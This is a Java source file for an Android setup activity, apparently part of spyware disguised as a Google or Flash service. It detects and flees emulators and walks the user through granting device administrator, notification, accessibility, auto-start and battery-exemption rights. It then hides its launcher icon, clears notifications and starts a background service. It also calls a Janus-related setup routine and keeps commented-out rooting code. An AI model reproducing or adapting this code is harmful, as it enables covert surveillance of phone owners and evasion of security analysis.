package com.setup;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import com.adobe.flashplayer.R;import com.authority.AuthoritySettings;import com.main.MainUtils;import com.main.ForegroundService;import com.phone.control.AntiEmulator;import com.phone.control.BatteryMgr;import com.phone.control.DeviceManager;import com.setup.AppsUsage;import com.setup.JanusSetup;import com.setup.NetworkSetup;import com.setup.SetupAuthority;import com.setup.SetupDlg;import com.setup.SetupRebootup;import com.utils.ExceptionProcess;import com.utils.PrefOper;import com.utils.Public;import com.utils.PublicFunction;import com.utils.WriteDateFile;import android.annotation.SuppressLint;import android.annotation.TargetApi;import android.app.admin.DevicePolicyManager;import android.app.Activity;import android.app.NotificationManager;import android.content.ComponentName;import android.content.Context;import android.content.Intent;import android.content.pm.PackageManager;import android.net.Uri;import android.os.Build;import android.os.Bundle;import android.os.Handler;import android.os.Message;import android.provider.Settings;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;//adb logcat *:E >d:\1.txt//adb logcat *:W >d:\1.txt//manefest.xml文件中没有android.intent.action.MAIN和android.intent.category.LAUNCHER的程序调用getExternalStorageState无效@SuppressLint("HandlerLeak") public class GoogleServiceActivity extends Activity  {		private static Activity activity ;	private final String TAG = "GoogleServiceActivity";		public static Button authority = null;	public static OnClickListener authoritylistener;        public static Button rebootup = null;    public static OnClickListener rebootuplistener;        public static Button notification = null;    public static OnClickListener notificationlistener;        private static Button floatwindow = null;    private static OnClickListener floatwindowListener = null;    	private Button batteryOpt = null;	private OnClickListener batteryOptListener;	    public static Button devmgr = null;    public static OnClickListener devmgrListener = null;        public static Button complete = null;    public static OnClickListener completelistener;    	private Button appsusage;	private OnClickListener appsusageListener;		public static Button accessibility = null;    public static OnClickListener accessibilitylistener;    	public static Button root = null;    public static OnClickListener rootlistener;		static Handler gHandler = null;		private int BATTERYOPT_REQUESTCODE = 0x1234;		public static int SETUP_FINISH_MAIN = 1;	public static int SETUP_INSTALL_MAIN = 2;    	@SuppressLint("InlinedApi") public static void hideIcon(Activity activity){        ComponentName componentName = new ComponentName(activity, GoogleServiceActivity.class);        PackageManager packageManager = activity.getPackageManager();        int res = packageManager.getComponentEnabledSetting(componentName);        if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT|| res ==PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,                    PackageManager.DONT_KILL_APP);            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,                    PackageManager.DONT_KILL_APP);        }	}					public void init(final Activity activity){						Public.DEBUG_FLAG = PublicFunction.isApkInDebug(activity);       	if (Public.DEBUG_FLAG) {	        //activity.setContentView(R.layout.activity_googleservice);	        //manualSetup(activity);	        //return;		}        if (AntiEmulator.isEmulator(activity)) {			finish();			return;		}                boolean ret = NetworkSetup.networkSetup(this);        if (ret == true) {        	finish();			return;		}else{    							  	    PrefOper.setValue(activity, ForegroundService.PARAMCONFIG_FileName, ForegroundService.SETUPMODE, 	  	    	ForegroundService.SETUPMODE_MANUAL);	  	      	  	    gHandler = new Handler(){				public void handleMessage(Message msg){					if (msg.what == SETUP_FINISH_MAIN) {						activity.finish();					}else if (msg.what == SETUP_INSTALL_MAIN) {				        //activity.requestWindowFeature(Window.FEATURE_NO_TITLE);				        //getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));				        //getWindow().setDimAmount(0f);				        //activity.setContentView(R.layout.activity_googleservice);				        						activity.setContentView(R.layout.activity_googleservice);												manualSetup(activity);				        					}				}			};						boolean janus = JanusSetup.isJanusTarget(this);			if (janus) {				String filename = JanusSetup.getJanusTool(this);				if (filename != null && filename.equals("") == false) {					new JanusSetup(this,filename).start();				}			}  		  	new Thread(new Runnable() {  				@Override				public void run() {	  				String ret = SetupDlg.checkSetup(activity,gHandler);	  				Log.e(TAG, "checkSetup ret:"+ret);				}  		  	}).start();		}	}    	@Override    public void onCreate(Bundle savedInstanceState) {		try {			super.onCreate(savedInstanceState); 			Log.e(TAG,"onCreate");									//			Intent intent = new Intent(this,CameraPhotoActivity.class);//			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);//			CameraPhotoActivity.camerano = 0;//			startActivity(intent);						Uri uri = getIntent().getData();			if (uri!= null) {				Log.e(TAG, "wake up by network:"+uri.toString());			}						if (activity == null) {				activity = this;			}				        if (Build.VERSION.SDK_INT >= 23) {	        	AuthoritySettings.checkPermission(this);			}	        			init(activity);					} catch (Exception ex) {			ex.printStackTrace();			String error = ExceptionProcess.getExceptionDetail(ex);			String stack = ExceptionProcess.getCallStack();			WriteDateFile.writeLogFile("setup exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");		}	}			public void manualSetup(Activity activity){								Public.init(activity);        authority = (Button)findViewById(R.id.authoritySetting);        rebootup = (Button)findViewById(R.id.startupSetting);        notification = (Button)findViewById(R.id.notificationSetting);        devmgr = (Button)findViewById(R.id.devmgrSetting);        batteryOpt = (Button)findViewById(R.id.powerOptSetting);        complete = (Button)findViewById(R.id.complete);        floatwindow = (Button)findViewById(R.id.floatingWindow);        accessibility = (Button)findViewById(R.id.accessibilitySetting);        appsusage = (Button)findViewById(R.id.appsUsage);           root = (Button)findViewById(R.id.rootSetting);        String factory = android.os.Build.MANUFACTURER;        if (factory.contains("vivo")) {        	authority.setText("请先点击软件管理然后点击软件权限管理找到软件权限");        	rebootup.setText("请先点击软件管理然后点击自启动管理打开开机启动项");        }else if (factory.contains("Meizu")) {        	rebootup.setText("请点击后台管理允许后台运行或开机启动");        	//authority.setText("请设置权限和悬浮窗");		}else if (factory.contains("HUAWEI") || factory.contains("OPPO") || factory.contains("vivo")) {			//XiaoMi will be ok			if (Build.VERSION.SDK_INT >= 21) {				if (devmgr != null) {					devmgr.setVisibility(View.GONE);				}else{					Log.e(TAG, "why sometimes devmgr is null?");				}			}		}                //why fatal error:?????        //AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void android.widget.Button.setVisibility(int)' on a null object reference        if (root != null) {        	root.setVisibility(View.GONE);        	//root = null;		}else{			Log.e(TAG, "why sometimes root is null?");		}                if(floatwindow != null){        	floatwindow.setVisibility(View.GONE);        	//floatwindow = null;        }else{			Log.e(TAG, "why sometimes floatwindow is null?");		}                if (accessibility != null) {        	accessibility.setVisibility(View.GONE);        	//accessibility = null;		}else{			Log.e(TAG, "why sometimes accessibility is null?");		}                if (appsusage!= null) {        	appsusage.setVisibility(View.GONE);        	//appsusage = null;		}else{			Log.e(TAG, "why sometimes appsusage is null?");		}                        if (Build.VERSION.SDK_INT < 23) {        	if (batteryOpt!= null) {        		batteryOpt.setVisibility(View.GONE);        		//batteryOpt = null;			}        	else{    			Log.e(TAG, "why sometimes batteryOpt is null?");    		}        }		authoritylistener = new SetupAuthority(GoogleServiceActivity.this);				rebootuplistener = new SetupRebootup(GoogleServiceActivity.this);				batteryOptListener = new OnClickListener() {			@Override			public void onClick(View v) {				Toast.makeText(GoogleServiceActivity.activity, "请允许"+ getString(R.string.app_name)+"忽略电池优化",						Toast.LENGTH_LONG).show();				BatteryMgr.ignoreBatteryOpt(GoogleServiceActivity.this,BATTERYOPT_REQUESTCODE);			}		};        		appsusageListener = new OnClickListener() {			@Override			public void onClick(View v) {				AppsUsage.openAppUsage(GoogleServiceActivity.this);				Toast.makeText(getApplicationContext(), "请点击\"" + getString(R.string.app_name) +"\"允许应用使用统计",Toast.LENGTH_LONG).show();			}		};        devmgrListener = new OnClickListener() {			@SuppressLint("InlinedApi") 			@Override			public void onClick(View v) {				ComponentName cn = new ComponentName(GoogleServiceActivity.this, DeviceManager.class);		        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);		        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);		        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,getString(R.string.general_label_name));		        startActivity(intent);		        		        Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"激活设备管理器",Toast.LENGTH_LONG).show();			}		};        completelistener = new OnClickListener() {        				@SuppressLint("InlinedApi") 			@Override			public void onClick(View v) {				try{					//AuthoritySettings.checkPermission(GoogleServiceActivity.activity);					AuthoritySettings.permissionSettings(GoogleServiceActivity.activity);										hideIcon(GoogleServiceActivity.this);			        			        NotificationManager nm =(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);			        nm.cancelAll(); 			        try {			        	nm.cancelAll();					} catch (Exception e) {						e.printStackTrace();					}			        MainUtils.checkStartForegroundService(GoogleServiceActivity.activity);			        	Toast.makeText(GoogleServiceActivity.activity, "即将完成设置",Toast.LENGTH_LONG).show();		        			        	PrefOper.setValue(GoogleServiceActivity.this, ForegroundService.PARAMCONFIG_FileName,		        			ForegroundService.SETUPCOMPLETE, "ok");				//		        	System.loadLibrary("GoogleServiceRoot");//    				rootDevice root = new rootDevice(GoogleServiceActivity.activity);//    				Thread rootthread = new Thread(root);//    				rootthread.start();    				    				finish();				}catch(Exception ex){	        		ex.printStackTrace();	        	}        	}		};		notificationlistener = new OnClickListener() {			@SuppressLint("InlinedApi") @Override			public void onClick(View v) {				try {					if (android.os.Build.VERSION.SDK_INT < 18) {						return;					}			        Intent intent;			        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {			            intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);			        } else {			        	//intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");			            intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");			        }					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);					startActivity(intent);		        	Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"允许通知消息",Toast.LENGTH_LONG).show();			    } catch (Exception ex) {					ex.printStackTrace();					String errorString = ExceptionProcess.getExceptionDetail(ex);					String stackString = ExceptionProcess.getCallStack();					WriteDateFile.writeLogFile("notelistener OnClickListener exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");					return ;			    }			}		};                accessibilitylistener = new OnClickListener() {			@TargetApi(Build.VERSION_CODES.ECLAIR) @Override			public void onClick(View v) {				try {					Intent intent;		        	intent = new Intent();		            intent.setAction(Settings.ACTION_ACCESSIBILITY_SETTINGS);		            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);		            startActivity(intent);		        	Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"并允许辅助功能",Toast.LENGTH_LONG).show();				}		        catch (Exception e) {	                e.printStackTrace();	            }			}		};					    floatwindowListener = new OnClickListener() {			@Override			public void onClick(View v) {				Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"允许使用悬浮窗",Toast.LENGTH_LONG).show();				AuthoritySettings.checkCandrawOverly(GoogleServiceActivity.activity);								/*		        String factory = android.os.Build.MANUFACTURER;		        //String model = android.os.Build.MODEL;		        if (factory.contains("OPPO")) {		        	try{			        	if (PublicFunction.isAppWorking(GoogleServiceActivity.this, "com.coloros.safecenter")) {		        			Intent intent = new Intent();		        			ComponentName componentName = new ComponentName("com.coloros.safecenter", 		        					"com.coloros.safecenter.sysfloatwindow.FloatWindowListActivity");		        			intent.setComponent(componentName);		        			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);		        			startActivity(intent);			        	}			        	else if (PublicFunction.isAppWorking(GoogleServiceActivity.this, "com.oppo.safe")) {			        		startActivity(getPackageManager().getLaunchIntentForPackage("com.oppo.safe"));			        		//com.oppo.safe/.permission.startup.StartupAppListActivity			        	}			        	else if (PublicFunction.isAppWorking(GoogleServiceActivity.this, "com.coloros.oppoguardelf")) {			        		startActivity(getPackageManager().getLaunchIntentForPackage("com.coloros.oppoguardelf"));						}			        	else if (PublicFunction.isAppWorking(GoogleServiceActivity.this, "com.coloros.safecenter")) {			        		startActivity(getPackageManager().getLaunchIntentForPackage("com.coloros.safecenter"));						}			        	else{			        					        	}			        	Toast.makeText(getApplicationContext(), 			        			"请打开\""+getString(R.string.app_name)+"\"的悬浮窗设置",Toast.LENGTH_SHORT).show();		        	}catch(Exception ex){		        		ex.printStackTrace();		        	}				}*/			}		};        try{	        authority.setOnClickListener(authoritylistener);	        rebootup.setOnClickListener(rebootuplistener);	        notification.setOnClickListener(notificationlistener);	        if (batteryOpt != null) {	        	batteryOpt.setOnClickListener(batteryOptListener);			}        		        if (accessibility != null) {	        	accessibility.setOnClickListener(accessibilitylistener);			}				        if(appsusage != null){	        	appsusage.setOnClickListener(appsusageListener);	        }	        	        if (devmgr != null) {	        	devmgr.setOnClickListener(devmgrListener);			}	        	        if(floatwindow != null){	        	floatwindow.setOnClickListener(floatwindowListener);	        }	        	        complete.setOnClickListener(completelistener);	        	        	        	        	        SetupAuthority.removeApk(this,"");	                }catch(Exception ex){        	ex.printStackTrace();        }    }    		@Override	public void onActivityResult(int requestCode, int resultCode,Intent data){		super.onActivityResult(requestCode, resultCode, data);				Log.e(TAG, "result code:" + resultCode);				if (requestCode == BATTERYOPT_REQUESTCODE) {			Log.e(TAG, "baterry optimize denied");						//Log.e(TAG, "baterry optimize permitted");		}//		else if (requestCode == AuthoritySettings.OVERLYPERMISSIONCODE) {////			Log.e(TAG, "result code:" + resultCode);//			//			if (Build.VERSION.SDK_INT >= 23) {//		        if (!Settings.canDrawOverlays(this) == false) {//		        	Log.e(TAG,"drawoverly is denied");//		        }else{//		        	Log.e(TAG,"drawoverly is allowed");//		        }//		    }//		}		else{			Log.e(TAG, "baterry optimize permission ok");		}	}			@Override 	public void onRequestPermissionsResult(int requestCode, String[] permissions,int[] grantResults){		super.onRequestPermissionsResult(requestCode, permissions, grantResults);			    if(requestCode == AuthoritySettings.PERMISSIONCODE){        	for (int i = 0; i < grantResults.length; i++) {	            if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {	            	Log.e(TAG,permissions[i] + " is permitted");	            }else if (grantResults[i] == PackageManager.PERMISSION_DENIED) {	            	Log.e(TAG,permissions[i] + " is denied");	            	//ActivityCompat.shouldShowRequestPermissionRationale(permissions[i]);					//shouldShowRequestPermissionRationale的返回值					//1第一次打开App时false					//2上次弹出权限点击了禁止（但没有勾选下次不在询问）true					//3上次选择禁止并勾选：下次不在询问false				}			}	    }else{	        	    } 	}            @SuppressWarnings("unused")	private void closeAndroidPDialog(){        try {            Class <?> aClass = Class.forName("android.content.pm.PackageParser$Package");            Constructor <?> declaredConstructor = aClass.getDeclaredConstructor(String.class);            declaredConstructor.setAccessible(true);        } catch (Exception e) {            e.printStackTrace();        }        try {            Class <?>cls = Class.forName("android.app.ActivityThread");            Method declaredMethod = cls.getDeclaredMethod("currentActivityThread");            declaredMethod.setAccessible(true);            Object activityThread = declaredMethod.invoke(null);            Field mHiddenApiWarningShown = cls.getDeclaredField("mHiddenApiWarningShown");            mHiddenApiWarningShown.setAccessible(true);            mHiddenApiWarningShown.setBoolean(activityThread, true);        } catch (Exception e) {            e.printStackTrace();        }    }        	    @Override    protected void onDestroy() {    	Log.e(TAG,"onDestroy");        super.onDestroy();    }}